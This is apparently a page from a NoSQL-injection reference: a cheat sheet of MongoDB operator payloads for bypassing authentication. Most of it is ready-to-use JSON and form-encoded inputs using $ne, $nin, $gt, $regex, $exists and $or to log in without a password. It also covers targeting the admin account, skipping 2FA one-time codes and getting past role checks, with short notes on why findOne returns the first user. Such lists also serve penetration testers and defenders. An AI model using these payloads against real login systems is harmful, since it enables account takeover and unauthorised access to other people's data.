# Auth bypass — the login-filter injections

## The classic — `{"user": {"$ne": null}, "pass": {"$ne": null}}`

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
```

`$ne: null` — exists and not null — matches ANY user — `findOne` returns
the FIRST doc — usually admin/first-registered — the auth-bypass —
`operators.md`.

## The variants — the `$ne`-family

```json
{"user": {"$ne": "nosuch"}, "pass": {"$ne": "x"}}
{"user": {"$ne": ""}, "pass": {"$ne": ""}}
{"user": {"$ne": 0}, "pass": {"$ne": 0}}
{"user": {"$ne": []}, "pass": {"$ne": []}}
{"user": {"$ne": false}, "pass": {"$ne": false}}
{"user": {"$nin": []}, "pass": {"$nin": []}}
{"user": {"$nin": ["nosuch"]}, "pass": {"$nin": ["x"]}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$gte": ""}, "pass": {"$gte": ""}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$regex": "^"}, "pass": {"$regex": "^"}}
{"user": {"$regex": "^a"}, "pass": {"$regex": "^a"}}
{"user": {"$exists": true}, "pass": {"$exists": true}}
{"user": {"$not": {"$eq": "nosuch"}}, "pass": {"$not": {"$eq": "x"}}}
{"user": {"$type": "string"}, "pass": {"$type": "string"}}
{"user": {"$not": {"$type": 10}}, "pass": {"$not": {"$type": 10}}}
```

## The targeted bypass — `{"user": "admin", "pass": {"$ne": null}}`

```json
{"user": "admin", "pass": {"$ne": null}}
```

Target a KNOWN username — the `$ne` on the pass — log in as `admin`
without the password — the targeted-bypass.

## The `$or` bypass — `{"$or": [{"user":"admin"},{"user":"x"}]}`

```json
{"$or": [{"user": "admin"}, {"user": "x"}], "pass": {"$ne": null}}
```

`$or` — either branch — the app's `findOne({user: req.body.user, ...})`
receives the `$or`-object — the filter becomes "user is admin OR x" —
the `$or`-bypass.

## The `[$ne]` form-syntax — `user[$ne]=x&pass[$ne]=x`

```text
user[$ne]=x&pass[$ne]=x
user[$gt]=&pass[$gt]=
user[$regex]=.*&pass[$regex]=.*
user[$ne]=null&pass[$ne]=null
user[$nin][]=x&pass[$nin][]=x
```

The `qs`-syntax — `injection-points.md`.

## The partial-bypass — the username-only

```json
{"user": {"$regex": "^admin"}, "pass": {"$ne": null}}
```

`^admin` — any user starting with `admin` — the partial-bypass —
`extraction.md` for the char-by-char.

## The `findOne` vs `find` — the first-doc

```javascript
User.findOne({user, pass})   — returns the FIRST match — the $ne lands on the first doc
User.find({user, pass})      — returns ALL matches — the $ne returns everything
```

`findOne` with `$ne` — the first doc — usually `admin`/first-registered —
the "which user did you get" question — `detection.md`.

## The password-field bypass — `pass[$ne]` on a hashed field

The `pass` field is hashed — `pass[$ne]=x` matches any hash — the
`$ne` bypasses the password-check — but `bcrypt.compare` on a
non-string pass may throw — `common-mistakes.md`.

## The 2FA-bypass — `{"otp": {"$ne": null}}`

```json
{"user": "admin", "pass": "x", "otp": {"$ne": null}}
```

The OTP-field — `$ne` bypasses the code-check — the 2FA-bypass.

## The registration-check — `{"user": {"$exists": false}}`

```json
{"user": {"$exists": false}}
```

A registration that checks `findOne({user})` — `{$exists: false}`
doesn't match — but that's the POINT (registration wants no-match) —
a different shape — `extraction.md`.

## The role-bypass — `{"role": {"$ne": "user"}}`

```json
{"user": "admin", "pass": {"$ne": null}, "role": {"$ne": "user"}}
```

The role-filter — `$ne: "user"` matches `admin`/`root` — the role-bypass.

## The common failure — the `bcrypt.compare` type-error

```javascript
bcrypt.compare(req.body.pass, user.hash)
```

`req.body.pass` is an OBJECT `{$ne: null}` — `bcrypt.compare` throws —
the bypass is blocked by the type-check — `common-mistakes.md`.
